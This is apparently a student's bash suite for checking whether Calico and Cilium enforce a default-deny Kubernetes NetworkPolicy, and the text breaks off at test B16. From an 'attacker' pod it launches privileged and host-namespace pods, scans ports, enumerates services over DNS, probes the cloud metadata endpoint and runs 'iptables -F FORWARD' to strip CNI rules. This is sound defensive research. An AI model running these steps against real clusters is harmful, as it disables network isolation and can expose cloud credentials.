#!/bin/bash
# =============================================================================
# CNI BYPASS TEST SUITE — COMPREHENSIVE EDITION
# Title: Security Challenges in Container Orchestration
# Student: Sagarkumar Bhaveshbhai Bhikadiya | ID: 24051080
# Module: CT7P01
#
# Usage: ./bypass-test-suite.sh <cluster-context>
#   cluster-context: kind-calico-cluster OR kind-cilium-cluster
#
# PREREQUISITE: default-deny NetworkPolicy must be applied before running.
#   kubectl apply -f default-deny.yaml --context <cluster-context>
#
# PURPOSE: This script tests every known bypass technique against an active
#   default-deny NetworkPolicy. An ALLOWED result means the CNI failed to
#   enforce the policy for that technique. Results are compared between
#   Calico (iptables) and Cilium (eBPF) to expose architectural differences.
#
# BYPASS CATEGORIES:
#   Category 1: Network Namespace Bypasses       (B01-B04)
#   Category 2: Protocol & Port Bypasses         (B05-B09)
#   Category 3: Service & Routing Bypasses       (B10-B13)
#   Category 4: Kernel & Capability Bypasses     (B14-B17)
#   Category 5: CNI-Specific Bypasses            (B18-B20)
#   Category 6: Application Layer Bypasses       (B21-B24)
#
# Output: ./bypass-results/<context>-bypass-<timestamp>.txt
#         ./bypass-results/<context>-bypass-<timestamp>.csv
# =============================================================================

set -uo pipefail

# --- Arguments ---------------------------------------------------------------
if [[ $# -lt 1 ]]; then
  echo "Usage: $0 <cluster-context>"
  echo "  cluster-context: kind-calico-cluster OR kind-cilium-cluster"
  exit 1
fi

CTX="$1"
NAMESPACE="default"
ATTACKER_POD="attacker-netshoot"
ATTACKER_IMAGE="nicolaka/netshoot"
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
RESULTS_DIR="./bypass-results"
mkdir -p "$RESULTS_DIR"
REPORT_FILE="${RESULTS_DIR}/${CTX}-bypass-${TIMESTAMP}.txt"
CSV_FILE="${RESULTS_DIR}/${CTX}-bypass-${TIMESTAMP}.csv"

if echo "$CTX" | grep -q "calico"; then
  CNI_NAME="Calico (iptables)"
else
  CNI_NAME="Cilium (eBPF)"
fi

# --- Counters ----------------------------------------------------------------
TOTAL=0
ALLOWED=0
BLOCKED=0
ERRORS=0

# --- Helpers -----------------------------------------------------------------
log() { echo "$1" | tee -a "$REPORT_FILE"; }

init_csv() {
  echo "BypassID,TechniqueID,BypassName,Category,Cluster,CNI,Result,Detail,Timestamp" > "$CSV_FILE"
}

record_result() {
  local BID="$1"
  local TID="$2"
  local NAME="$3"
  local CAT="$4"
  local RESULT="$5"
  local DETAIL="$6"

  TOTAL=$((TOTAL + 1))
  case "$RESULT" in
    ALLOWED) ALLOWED=$((ALLOWED + 1)); SYM="[ALLOWED] *** BYPASS CONFIRMED ***" ;;
    BLOCKED) BLOCKED=$((BLOCKED + 1)); SYM="[BLOCKED]" ;;
    *)       ERRORS=$((ERRORS + 1));   SYM="[ERROR]  " ;;
  esac

  log "  ${SYM}"
  log "  ${BID} | ${TID} | ${NAME}"
  log "  Category: ${CAT}"
  log "  Detail: ${DETAIL}"
  log ""
  echo "\"${BID}\",\"${TID}\",\"${NAME}\",\"${CAT}\",\"${CTX}\",\"${CNI_NAME}\",\"${RESULT}\",\"${DETAIL}\",\"${TIMESTAMP}\"" >> "$CSV_FILE"
}

exec_attack() {
  kubectl exec "$ATTACKER_POD" -n "$NAMESPACE" --context "$CTX" \
    -- sh -c "$1" 2>/dev/null
  return $?
}

test_tcp() {
  kubectl exec "$ATTACKER_POD" -n "$NAMESPACE" --context "$CTX" \
    -- sh -c "nc -z -w${3:-3} ${1} ${2}" 2>/dev/null
  return $?
}

test_udp() {
  kubectl exec "$ATTACKER_POD" -n "$NAMESPACE" --context "$CTX" \
    -- sh -c "nc -u -z -w${3:-3} ${1} ${2}" 2>/dev/null
  return $?
}

cleanup_pod() {
  kubectl delete pod "$1" -n "$NAMESPACE" --context "$CTX" \
    --ignore-not-found=true --grace-period=0 --force 2>/dev/null || true
}

wait_for_pod() {
  kubectl wait pod "$1" -n "$NAMESPACE" --context "$CTX" \
    --for=condition=Ready --timeout=30s 2>/dev/null
  return $?
}

deploy_bypass_pod() {
  local POD_NAME="$1"
  local OVERRIDE="$2"
  cleanup_pod "$POD_NAME"
  kubectl run "$POD_NAME" \
    --image="$ATTACKER_IMAGE" \
    --restart=Never \
    --context "$CTX" \
    -n "$NAMESPACE" \
    --overrides="$OVERRIDE" 2>/dev/null || true
  sleep 20
  kubectl get pod "$POD_NAME" -n "$NAMESPACE" --context "$CTX" \
    --no-headers 2>/dev/null | awk '{print $3}'
}

# --- Pre-flight --------------------------------------------------------------
preflight() {
  log "[PREFLIGHT] Verifying cluster is reachable..."
  if ! kubectl get nodes --context "$CTX" --no-headers 2>/dev/null | grep -q "Ready"; then
    log "[FATAL] Cluster ${CTX} not reachable."
    exit 1
  fi
  log "[OK] Cluster reachable."

  POLICY_COUNT=$(kubectl get networkpolicies -A --context "$CTX" \
    --no-headers 2>/dev/null | wc -l | tr -d ' ')
  log "[PREFLIGHT] NetworkPolicy count: ${POLICY_COUNT}"
  if [[ "$POLICY_COUNT" -eq 0 ]]; then
    log "[WARNING] NO NetworkPolicies detected."
    log "[WARNING] Apply default-deny.yaml before running bypass tests."
    log "[WARNING] Results will be meaningless without an active policy."
    log ""
  fi

  # Resolve key service IPs
  REDIS_IP=$(kubectl get svc redis-cart -n "$NAMESPACE" --context "$CTX" \
    -o jsonpath='{.spec.clusterIP}' 2>/dev/null || echo "unknown")
  FRONTEND_IP=$(kubectl get svc frontend -n "$NAMESPACE" --context "$CTX" \
    -o jsonpath='{.spec.clusterIP}' 2>/dev/null || echo "unknown")
  KUBE_DNS_IP=$(kubectl get svc kube-dns -n kube-system --context "$CTX" \
    -o jsonpath='{.spec.clusterIP}' 2>/dev/null || echo "10.96.0.10")
  NODE_IP=$(kubectl get nodes --context "$CTX" \
    -o jsonpath='{.items[0].status.addresses[0].address}' 2>/dev/null || echo "unknown")
  log "[OK] redis-cart=${REDIS_IP} | frontend=${FRONTEND_IP} | kube-dns=${KUBE_DNS_IP} | node=${NODE_IP}"

  # Ensure attacker pod is running
  STATUS=$(kubectl get pod "$ATTACKER_POD" -n "$NAMESPACE" --context "$CTX" \
    --no-headers 2>/dev/null | awk '{print $3}')
  if [[ "$STATUS" != "Running" ]]; then
    log "[SETUP] Deploying fresh attacker pod..."
    cleanup_pod "$ATTACKER_POD"
    kubectl run "$ATTACKER_POD" \
      --image="$ATTACKER_IMAGE" \
      --restart=Never \
      --context "$CTX" \
      -n "$NAMESPACE" \
      --overrides='{"spec":{"containers":[{"name":"attacker-netshoot","image":"nicolaka/netshoot","command":["sleep","86400"],"securityContext":{"capabilities":{"add":["NET_ADMIN","NET_RAW","SYS_PTRACE"]}}}]}}' 2>/dev/null || true
    kubectl wait pod "$ATTACKER_POD" -n "$NAMESPACE" --context "$CTX" \
      --for=condition=Ready --timeout=60s 2>/dev/null || true
  fi
  log "[OK] Attacker pod: ${STATUS:-deploying}"
  log ""
}

# =============================================================================
# CATEGORY 1: NETWORK NAMESPACE BYPASSES
# These tests attempt to escape the pod network namespace where
# NetworkPolicy rules are enforced.
# =============================================================================
cat1() {
  log "============================================================"
  log " CATEGORY 1: Network Namespace Bypasses"
  log "============================================================"
  log ""

  # B01 — hostNetwork Pod Bypass (T1611)
  # A pod with hostNetwork:true uses the node network namespace.
  # Kubernetes NetworkPolicy only governs pod namespaces.
  # Calico writes iptables rules per pod netns — host netns is outside scope.
  # Cilium attaches eBPF at node interface level — may still enforce.
  log "--- B01 | T1611 | hostNetwork Pod Bypass ---"
  log "    Deploying hostNetwork:true pod to bypass pod-namespace NetworkPolicy..."
  HN_STATUS=$(deploy_bypass_pod "bypass-hostnet" '{
    "spec": {
      "hostNetwork": true,
      "containers": [{
        "name": "bypass-hostnet",
        "image": "nicolaka/netshoot",
        "command": ["sleep","120"],
        "securityContext": {"capabilities": {"add": ["NET_ADMIN","NET_RAW"]}}
      }]
    }
  }')
  if [[ "$HN_STATUS" == "Running" ]]; then
    HN_RESULT=$(kubectl exec bypass-hostnet -n "$NAMESPACE" --context "$CTX" \
      -- sh -c "nc -z -w3 redis-cart.${NAMESPACE}.svc.cluster.local 6379 && echo OPEN || echo CLOSED" 2>/dev/null || echo "CLOSED")
    cleanup_pod "bypass-hostnet"
    if [[ "$HN_RESULT" == "OPEN" ]]; then
      record_result "B01" "T1611" "hostNetwork Pod NetworkPolicy Bypass" "Network Namespace" \
        "ALLOWED" "hostNetwork pod reached redis-cart:6379 — NetworkPolicy does not govern host network namespace. Calico iptables rules are per-pod-netns only"
    else
      record_result "B01" "T1611" "hostNetwork Pod NetworkPolicy Bypass" "Network Namespace" \
        "BLOCKED" "hostNetwork pod blocked from redis-cart — CNI enforcing beyond pod namespace scope (Cilium eBPF node-level enforcement)"
    fi
  else
    cleanup_pod "bypass-hostnet"
    record_result "B01" "T1611" "hostNetwork Pod NetworkPolicy Bypass" "Network Namespace" \
      "ERROR" "hostNetwork pod failed to start (status: ${HN_STATUS}) — image pull blocked by egress policy or admission control"
  fi

  # B02 — hostPID Namespace Bypass (T1057)
  # hostPID:true shares the host PID namespace — attacker can see all host processes.
  # Also allows /proc/<PID>/net/ access to other pods' network connections.
  # NetworkPolicy does not restrict /proc filesystem access.
  log "--- B02 | T1057 | hostPID Namespace Process Visibility ---"
  HPID_STATUS=$(deploy_bypass_pod "bypass-hostpid" '{
    "spec": {
      "hostPID": true,
      "containers": [{
        "name": "bypass-hostpid",
        "image": "nicolaka/netshoot",
        "command": ["sleep","60"],
        "securityContext": {"capabilities": {"add": ["SYS_PTRACE"]}}
      }]
    }
  }')
  if [[ "$HPID_STATUS" == "Running" ]]; then
    PROC_COUNT=$(kubectl exec bypass-hostpid -n "$NAMESPACE" --context "$CTX" \
      -- sh -c "ls /proc | grep -E '^[0-9]+$' | wc -l" 2>/dev/null || echo "0")
    HOST_PROCS=$(kubectl exec bypass-hostpid -n "$NAMESPACE" --context "$CTX" \
      -- sh -c "cat /proc/1/cmdline 2>/dev/null | tr '\0' ' ' | head -c 50" 2>/dev/null || echo "")
    cleanup_pod "bypass-hostpid"
    if [[ "$PROC_COUNT" -gt 20 ]]; then
      record_result "B02" "T1057" "hostPID Namespace Process Visibility" "Network Namespace" \
        "ALLOWED" "${PROC_COUNT} host processes visible via /proc — hostPID gives attacker full process table of node. Host PID1: ${HOST_PROCS}. NetworkPolicy cannot restrict procfs access"
    else
      record_result "B02" "T1057" "hostPID Namespace Process Visibility" "Network Namespace" \
        "BLOCKED" "Only ${PROC_COUNT} processes visible — hostPID not granting full host process namespace access"
    fi
  else
    cleanup_pod "bypass-hostpid"
    record_result "B02" "T1057" "hostPID Namespace Process Visibility" "Network Namespace" \
      "ERROR" "hostPID pod failed to start (status: ${HPID_STATUS})"
  fi

  # B03 — hostIPC Namespace Bypass (T1611)
  # hostIPC:true shares the host IPC namespace.
  # Allows reading shared memory segments from other processes on the node.
  # NetworkPolicy does not restrict IPC.
  log "--- B03 | T1611 | hostIPC Namespace Shared Memory Access ---"
  HIPC_STATUS=$(deploy_bypass_pod "bypass-hostipc" '{
    "spec": {
      "hostIPC": true,
      "containers": [{
        "name": "bypass-hostipc",
        "image": "nicolaka/netshoot",
        "command": ["sleep","60"]
      }]
    }
  }')
  if [[ "$HIPC_STATUS" == "Running" ]]; then
    IPC_OUT=$(kubectl exec bypass-hostipc -n "$NAMESPACE" --context "$CTX" \
      -- sh -c "ipcs -m 2>/dev/null | wc -l" 2>/dev/null || echo "0")
    cleanup_pod "bypass-hostipc"
    if [[ "$IPC_OUT" -gt 2 ]]; then
      record_result "B03" "T1611" "hostIPC Namespace Shared Memory Access" "Network Namespace" \
        "ALLOWED" "Host IPC shared memory visible (${IPC_OUT} segments) — hostIPC grants access to node-level inter-process communication. NetworkPolicy does not govern IPC"
    else
      record_result "B03" "T1611" "hostIPC Namespace Shared Memory Access" "Network Namespace" \
        "BLOCKED" "No host IPC shared memory accessible"
    fi
  else
    cleanup_pod "bypass-hostipc"
    record_result "B03" "T1611" "hostIPC Namespace Shared Memory Access" "Network Namespace" \
      "ERROR" "hostIPC pod failed to start (status: ${HIPC_STATUS})"
  fi

  # B04 — Privileged Container Full Bypass (T1611)
  # A privileged container has full host capabilities including SYS_ADMIN.
  # Can manipulate network namespaces, mount filesystems, and load kernel modules.
  # NetworkPolicy cannot prevent this — it is a container security model bypass.
  log "--- B04 | T1611 | Privileged Container Capability Bypass ---"
  PRIV_STATUS=$(deploy_bypass_pod "bypass-privileged" '{
    "spec": {
      "containers": [{
        "name": "bypass-privileged",
        "image": "nicolaka/netshoot",
        "command": ["sleep","60"],
        "securityContext": {"privileged": true}
      }]
    }
  }')
  if [[ "$PRIV_STATUS" == "Running" ]]; then
    # Test if we can access network namespaces of other pods from this privileged container
    NSLIST=$(kubectl exec bypass-privileged -n "$NAMESPACE" --context "$CTX" \
      -- sh -c "ls /proc/1/net/ 2>/dev/null | wc -l" 2>/dev/null || echo "0")
    # Test if we can read host iptables rules (Calico stores enforcement here)
    IPT=$(kubectl exec bypass-privileged -n "$NAMESPACE" --context "$CTX" \
      -- sh -c "iptables -L 2>/dev/null | wc -l" 2>/dev/null || echo "0")
    cleanup_pod "bypass-privileged"
    if [[ "$NSLIST" -gt 5 ]] || [[ "$IPT" -gt 5 ]]; then
      record_result "B04" "T1611" "Privileged Container Capability Bypass" "Network Namespace" \
        "ALLOWED" "Privileged container accessed /proc/1/net (${NSLIST} entries) and iptables (${IPT} rules) — full host network stack visible. Privileged containers bypass container isolation model entirely"
    else
      record_result "B04" "T1611" "Privileged Container Capability Bypass" "Network Namespace" \
        "BLOCKED" "Privileged container restricted — host network stack not accessible"
    fi
  else
    cleanup_pod "bypass-privileged"
    record_result "B04" "T1611" "Privileged Container Capability Bypass" "Network Namespace" \
      "ERROR" "Privileged pod failed to start (status: ${PRIV_STATUS})"
  fi
}

# =============================================================================
# CATEGORY 2: PROTOCOL & PORT BYPASSES
# These tests exploit gaps in how NetworkPolicy handles specific
# protocols and port ranges.
# =============================================================================
cat2() {
  log "============================================================"
  log " CATEGORY 2: Protocol and Port Bypasses"
  log "============================================================"
  log ""

  # B05 — IPv6 Dual-Stack Gap (T1599)
  # Kubernetes NetworkPolicy was IPv4-first. Calico writes separate iptables/ip6tables.
  # If ip6tables rules are incomplete, IPv6 traffic bypasses IPv4 policy.
  log "--- B05 | T1599 | IPv6 Dual-Stack Enforcement Gap ---"
  REDIS_POD=$(kubectl get pods -n "$NAMESPACE" --context "$CTX" \
    --no-headers 2>/dev/null | grep "redis-cart" | awk '{print $1}' | head -1)
  REDIS_IPV6=$(kubectl get pod "$REDIS_POD" -n "$NAMESPACE" --context "$CTX" \
    -o jsonpath='{.status.podIPs[1].ip}' 2>/dev/null || echo "")
  if [[ -n "$REDIS_IPV6" ]] && [[ "$REDIS_IPV6" == *":"* ]]; then
    if exec_attack "nc -6 -z -w3 ${REDIS_IPV6} 6379"; then
      record_result "B05" "T1599" "IPv6 Dual-Stack Enforcement Gap" "Protocol Bypass" \
        "ALLOWED" "Connected to redis-cart via IPv6 (${REDIS_IPV6}:6379) despite IPv4 default-deny — ip6tables rules absent or incomplete. Calico requires explicit IPv6 policy"
    else
      record_result "B05" "T1599" "IPv6 Dual-Stack Enforcement Gap" "Protocol Bypass" \
        "BLOCKED" "IPv6 connection to redis-cart blocked — CNI enforces dual-stack policy correctly"
    fi
  else
    record_result "B05" "T1599" "IPv6 Dual-Stack Enforcement Gap" "Protocol Bypass" \
      "ERROR" "No IPv6 pod IPs found — IPv6 not enabled in KIND config. Enable with ipv6Subnet in KIND config"
  fi

  # B06 — UDP Protocol Bypass (T1048)
  # Many NetworkPolicy implementations focus on TCP.
  # DNS, NTP, and custom UDP services may be unfiltered.
  log "--- B06 | T1048 | UDP Protocol Bypass ---"
  UDP_OPEN=0
  # Test UDP on several ports
  for PORT in 53 123 161 1194 4500 5353; do
    if test_udp "8.8.8.8" "$PORT" 2; then
      UDP_OPEN=$((UDP_OPEN + 1))
    fi
  done
  # Also test UDP to internal services
  UDP_DNS=$(exec_attack "echo '' | nc -u -w2 ${KUBE_DNS_IP} 53 2>&1 | head -1" 2>/dev/null || echo "")
  if [[ $UDP_OPEN -gt 0 ]]; then
    record_result "B06" "T1048" "UDP Protocol Bypass" "Protocol Bypass" \
      "ALLOWED" "${UDP_OPEN} UDP ports reachable externally — default-deny may not fully cover UDP traffic"
  else
    record_result "B06" "T1048" "UDP Protocol Bypass" "Protocol Bypass" \
      "BLOCKED" "All UDP ports blocked — default-deny covering UDP as well as TCP"
  fi

  # B07 — SCTP Protocol Bypass (T1571)
  # SCTP (Stream Control Transmission Protocol) is supported by Kubernetes
  # NetworkPolicy but often overlooked in policy definitions.
  # Many CNIs do not enforce SCTP rules at all.
  log "--- B07 | T1571 | SCTP Protocol Bypass ---"
  SCTP_OUT=$(exec_attack "nc -z --sctp -w2 ${REDIS_IP} 6379 2>&1" 2>/dev/null || echo "")
  if echo "$SCTP_OUT" | grep -qi "open\|succeeded\|connected"; then
    record_result "B07" "T1571" "SCTP Protocol Bypass" "Protocol Bypass" \
      "ALLOWED" "SCTP connection to redis-cart:6379 succeeded — NetworkPolicy SCTP enforcement absent"
  else
    # SCTP not available — test if kernel module loaded
    SCTP_MOD=$(exec_attack "cat /proc/net/sctp/assocs 2>/dev/null | wc -l || echo 'unavailable'" 2>/dev/null || echo "unavailable")
    record_result "B07" "T1571" "SCTP Protocol Bypass" "Protocol Bypass" \
      "BLOCKED" "SCTP unavailable or blocked — kernel module not loaded or CNI filtering SCTP"
  fi

  # B08 — Non-Standard High Port Bypass (T1571)
  # Default-deny should block ALL ports. But if misconfigured allow rules
  # exist for specific ports, high/random ports may remain open.
  log "--- B08 | T1571 | Non-Standard Port Range Bypass ---"
  HIGH_OPEN=0
  HIGH_OPEN_PORT=""
  for PORT in 8080 8443 8888 9090 9200 9300 9999 4444 4445 5000 6000 7000 8000 31337 65000; do
    if test_tcp "frontend.${NAMESPACE}.svc.cluster.local" "$PORT" 2; then
      HIGH_OPEN=$((HIGH_OPEN + 1))
      HIGH_OPEN_PORT="$PORT"
    fi
  done
  # Also test against Redis on non-standard ports
  for PORT in 6380 6381 16379; do
    if test_tcp "redis-cart.${NAMESPACE}.svc.cluster.local" "$PORT" 2; then
      HIGH_OPEN=$((HIGH_OPEN + 1))
    fi
  done
  if [[ $HIGH_OPEN -gt 0 ]]; then
    record_result "B08" "T1571" "Non-Standard Port Range Bypass" "Protocol Bypass" \
      "ALLOWED" "${HIGH_OPEN} non-standard ports open (e.g. ${HIGH_OPEN_PORT}) — policy has gaps in port coverage"
  else
    record_result "B08" "T1571" "Non-Standard Port Range Bypass" "Protocol Bypass" \
      "BLOCKED" "All non-standard ports blocked — default-deny covering all unlisted ports correctly"
  fi

  # B09 — ICMP Protocol Bypass (T1018)
  # ICMP is not a TCP/UDP protocol — NetworkPolicy port rules do not apply.
  # Calico requires explicit ICMP deny rules to block ping.
  # Cilium's eBPF can block ICMP via policy but requires explicit config.
  log "--- B09 | T1018 | ICMP Protocol Bypass (Ping) ---"
  ICMP_OK=0
  # Test ICMP to other pods
  FRONTEND_POD_IP=$(kubectl get pods -n "$NAMESPACE" --context "$CTX" \
    --no-headers 2>/dev/null | grep "^frontend" | awk '{print $6}' | head -1)
  REDIS_POD_IP=$(kubectl get pods -n "$NAMESPACE" --context "$CTX" \
    --no-headers 2>/dev/null | grep "^redis-cart" | awk '{print $6}' | head -1)
  for TARGET_IP in "$FRONTEND_POD_IP" "$REDIS_POD_IP" "8.8.8.8"; do
    if [[ -n "$TARGET_IP" ]]; then
      if exec_attack "ping -c2 -W2 ${TARGET_IP} >/dev/null 2>&1"; then
        ICMP_OK=$((ICMP_OK + 1))
      fi
    fi
  done
  if [[ $ICMP_OK -gt 0 ]]; then
    record_result "B09" "T1018" "ICMP Protocol Bypass (Ping Sweep)" "Protocol Bypass" \
      "ALLOWED" "${ICMP_OK} ICMP targets responded — NetworkPolicy does not filter ICMP by default. Attacker can ping-sweep pod CIDR to discover live hosts"
  else
    record_result "B09" "T1018" "ICMP Protocol Bypass (Ping Sweep)" "Protocol Bypass" \
      "BLOCKED" "All ICMP blocked — CNI filtering ICMP traffic or no hosts responding"
  fi
}

# =============================================================================
# CATEGORY 3: SERVICE & ROUTING BYPASSES
# These tests exploit Kubernetes service abstractions and routing
# mechanisms that may not be covered by NetworkPolicy.
# =============================================================================
cat3() {
  log "============================================================"
  log " CATEGORY 3: Service and Routing Bypasses"
  log "============================================================"
  log ""

  # B10 — NodePort Service Bypass (T1021)
  # NodePort services expose a port on every node (30000-32767).
  # NetworkPolicy governs pod-to-pod traffic — but NodePort traffic
  # enters via the node's external interface and may bypass pod policies.
  log "--- B10 | T1021 | NodePort Service Bypass ---"
  # Find NodePort if frontend-external has one
  NODEPORT=$(kubectl get svc frontend-external -n "$NAMESPACE" --context "$CTX" \
    -o jsonpath='{.spec.ports[0].nodePort}' 2>/dev/null || echo "")
  if [[ -n "$NODEPORT" ]] && [[ "$NODEPORT" != "null" ]]; then
    if test_tcp "$NODE_IP" "$NODEPORT" 5; then
      record_result "B10" "T1021" "NodePort Service Bypass" "Service Bypass" \
        "ALLOWED" "NodePort ${NODEPORT} on node ${NODE_IP} reachable despite pod-level default-deny — traffic entering via NodePort may bypass NetworkPolicy ingress rules depending on CNI implementation"
    else
      record_result "B10" "T1021" "NodePort Service Bypass" "Service Bypass" \
        "BLOCKED" "NodePort ${NODEPORT} unreachable from attacker pod — CNI blocking even NodePort-routed traffic"
    fi
  else
    # Try common NodePort range directly
    NP_OPEN=0
    for PORT in 30000 30080 30443 31000 32000 32362 30509; do
      if test_tcp "$NODE_IP" "$PORT" 2; then
        NP_OPEN=$((NP_OPEN + 1))
      fi
    done
    if [[ $NP_OPEN -gt 0 ]]; then
      record_result "B10" "T1021" "NodePort Service Bypass" "Service Bypass" \
        "ALLOWED" "${NP_OPEN} NodePort range ports reachable on node ${NODE_IP}"
    else
      record_result "B10" "T1021" "NodePort Service Bypass" "Service Bypass" \
        "BLOCKED" "No NodePort ports reachable — network policy or node firewall blocking NodePort access"
    fi
  fi

  # B11 — Direct Pod IP Bypass (bypassing Service abstraction)
  # Services use kube-proxy/iptables DNAT to route traffic.
  # Connecting directly to a pod IP bypasses service-level controls.
  # NetworkPolicy applies to pod IPs — so this should still be blocked.
  # But some CNI implementations may have gaps when bypassing ClusterIP.
  log "--- B11 | T1021 | Direct Pod IP Bypass (bypassing ClusterIP) ---"
  REDIS_POD_IP=$(kubectl get pods -n "$NAMESPACE" --context "$CTX" \
    -o wide --no-headers 2>/dev/null | grep "redis-cart" | awk '{print $6}' | head -1)
  if [[ -n "$REDIS_POD_IP" ]] && [[ "$REDIS_POD_IP" != "<none>" ]]; then
    if test_tcp "$REDIS_POD_IP" "6379" 3; then
      record_result "B11" "T1021" "Direct Pod IP Bypass (ClusterIP bypass)" "Service Bypass" \
        "ALLOWED" "Direct connection to Redis pod IP (${REDIS_POD_IP}:6379) succeeded — bypassing ClusterIP service abstraction still works. NetworkPolicy should block this but CNI may have a gap"
    else
      record_result "B11" "T1021" "Direct Pod IP Bypass (ClusterIP bypass)" "Service Bypass" \
        "BLOCKED" "Direct pod IP connection blocked — NetworkPolicy correctly applied to pod IP, not just ClusterIP"
    fi
  else
    record_result "B11" "T1021" "Direct Pod IP Bypass (ClusterIP bypass)" "Service Bypass" \
      "ERROR" "Could not resolve Redis pod IP"
  fi

  # B12 — DNS Service Enumeration Post-Deny (T1046)
  # Even with default-deny, if DNS (UDP 53) is allowed for cluster operation,
  # an attacker can enumerate all service names and ClusterIPs via DNS queries.
  # This reveals the full internal service map even when direct connections blocked.
  log "--- B12 | T1046 | DNS Service Enumeration Post-Default-Deny ---"
  DNS_RESULTS=""
  DNS_RESOLVED=0
  for SVC in frontend cartservice redis-cart checkoutservice paymentservice; do
    RESULT=$(exec_attack "nslookup ${SVC}.${NAMESPACE}.svc.cluster.local 2>/dev/null | grep 'Address:' | tail -1" 2>/dev/null || echo "")
    if [[ -n "$RESULT" ]]; then
      DNS_RESOLVED=$((DNS_RESOLVED + 1))
      DNS_RESULTS="${DNS_RESULTS}${SVC}:$(echo $RESULT | awk '{print $2}') "
    fi
  done
  if [[ $DNS_RESOLVED -gt 0 ]]; then
    record_result "B12" "T1046" "DNS Service Enumeration Post-Default-Deny" "Service Bypass" \
      "ALLOWED" "${DNS_RESOLVED}/5 services resolved via DNS despite NetworkPolicy — attacker maps full service topology: ${DNS_RESULTS}. DNS must be allowed for cluster function but leaks service IPs"
  else
    record_result "B12" "T1046" "DNS Service Enumeration Post-Default-Deny" "Service Bypass" \
      "BLOCKED" "DNS resolution failed — default-deny blocking UDP 53 to kube-dns. WARNING: this breaks legitimate cluster DNS too"
  fi

  # B13 — Link-Local / Metadata Endpoint Bypass (T1530)
  # 169.254.0.0/16 is the link-local range. Cloud providers host instance
  # metadata at 169.254.169.254. NetworkPolicy may not cover link-local.
  # In KIND on bare-metal, tests egress filtering of non-routable ranges.
  log "--- B13 | T1530 | Link-Local Metadata Endpoint Bypass ---"
  META_CODE=$(exec_attack "curl -s --connect-timeout 3 -o /dev/null -w '%{http_code}' http://169.254.169.254/latest/meta-data/" 2>/dev/null || echo "000")
  if [[ "$META_CODE" =~ ^(200|301|302|401|403)$ ]]; then
    record_result "B13" "T1530" "Link-Local Metadata Endpoint Bypass" "Service Bypass" \
      "ALLOWED" "HTTP ${META_CODE} from 169.254.169.254 — cloud metadata endpoint reachable. In AWS/GCP/Azure this exposes IAM credentials and SSH keys"
  elif test_tcp "169.254.169.254" "80" 3; then
    record_result "B13" "T1530" "Link-Local Metadata Endpoint Bypass" "Service Bypass" \
      "ALLOWED" "TCP to 169.254.169.254:80 succeeded — link-local range not blocked by NetworkPolicy egress"
  else
    record_result "B13" "T1530" "Link-Local Metadata Endpoint Bypass" "Service Bypass" \
      "BLOCKED" "169.254.169.254 unreachable — egress policy blocking link-local range or no metadata service present"
  fi
}

# =============================================================================
# CATEGORY 4: KERNEL & CAPABILITY BYPASSES
# These tests use Linux kernel features and capabilities that operate
# below the network layer where CNI enforcement works.
# =============================================================================
cat4() {
  log "============================================================"
  log " CATEGORY 4: Kernel and Capability Bypasses"
  log "============================================================"
  log ""

  # B14 — Raw Socket Bypass (T1040)
  # Raw sockets (AF_PACKET) allow crafting arbitrary packets at L2.
  # They bypass the kernel TCP/UDP stack entirely.
  # NetworkPolicy enforces at L3/L4 via netfilter — raw sockets go under this.
  # Requires NET_RAW capability (which our attacker pod has).
  log "--- B14 | T1040 | Raw Socket Bypass (AF_PACKET) ---"
  RAW_OUT=$(exec_attack "python3 -c \"
import socket, struct
try:
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
    s.settimeout(2)
    print('RAW_SOCKET_OPEN')
    s.close()
except PermissionError:
    print('PERMISSION_DENIED')
except Exception as e:
    print('ERROR:' + str(e))
\" 2>/dev/null" 2>/dev/null || echo "UNAVAILABLE")
  if echo "$RAW_OUT" | grep -q "RAW_SOCKET_OPEN"; then
    record_result "B14" "T1040" "Raw Socket Bypass (AF_PACKET)" "Kernel Bypass" \
      "ALLOWED" "AF_PACKET raw socket opened successfully — attacker can craft arbitrary L2 frames bypassing netfilter/iptables. NetworkPolicy operates at L3+; raw L2 packets bypass it entirely"
  elif echo "$RAW_OUT" | grep -q "PERMISSION_DENIED"; then
    record_result "B14" "T1040" "Raw Socket Bypass (AF_PACKET)" "Kernel Bypass" \
      "BLOCKED" "AF_PACKET socket creation denied — NET_RAW capability not available or seccomp blocking raw sockets"
  else
    record_result "B14" "T1040" "Raw Socket Bypass (AF_PACKET)" "Kernel Bypass" \
      "ERROR" "Raw socket test inconclusive: ${RAW_OUT}"
  fi

  # B15 — iptables Direct Manipulation Bypass (T1562.001)
  # If the attacker can flush or modify iptables rules directly,
  # they can remove the CNI's enforcement rules entirely.
  # Calico writes policy as iptables rules — flushing them removes enforcement.
  # Cilium uses eBPF maps — iptables flush does not affect Cilium enforcement.
  # This is the single most important architectural difference between the CNIs.
  log "--- B15 | T1562.001 | iptables Direct Manipulation (CNI Rule Removal) ---"
  # First check if we can list rules
  IPT_LIST=$(exec_attack "iptables -L FORWARD --line-numbers 2>&1 | head -5" 2>/dev/null || echo "")
  if echo "$IPT_LIST" | grep -qi "Chain\|policy\|target"; then
    # Count Calico/Cilium specific rules
    CNI_RULES=$(exec_attack "iptables -L 2>/dev/null | grep -ciE 'cali|cilium|KUBE'" 2>/dev/null || echo "0")
    # Attempt to flush (this would break CNI enforcement if successful)
    FLUSH_OUT=$(exec_attack "iptables -F FORWARD 2>&1" 2>/dev/null || echo "permission denied")
    if echo "$FLUSH_OUT" | grep -qiE "^$|success"; then
      record_result "B15" "T1562.001" "iptables Direct Rule Manipulation" "Kernel Bypass" \
        "ALLOWED" "iptables FORWARD chain flushed — ${CNI_RULES} CNI rules removed. For Calico: this removes NetworkPolicy enforcement entirely. For Cilium: eBPF enforcement persists as iptables is not Cilium's enforcement mechanism"
    else
      record_result "B15" "T1562.001" "iptables Direct Rule Manipulation" "Kernel Bypass" \
        "BLOCKED" "iptables rules visible (${CNI_RULES} CNI rules) but FORWARD chain flush denied — capability restriction preventing rule modification"
    fi
  else
    record_result "B15" "T1562.001" "iptables Direct Rule Manipulation" "Kernel Bypass" \
      "BLOCKED" "iptables not accessible from inside pod — NET_ADMIN capability not available"
  fi

  # B16 — /proc Filesystem Network Namespace Pivot (T1611)
  # By reading /proc/<pid>/net/tcp of other processes, an attacker
  # can map all network connections on the node without making any
  # network connections themselves — completely invisible to NetworkPolicy.
  log "--- B16 | T1611 | /proc Network Namespace Pivot ---"
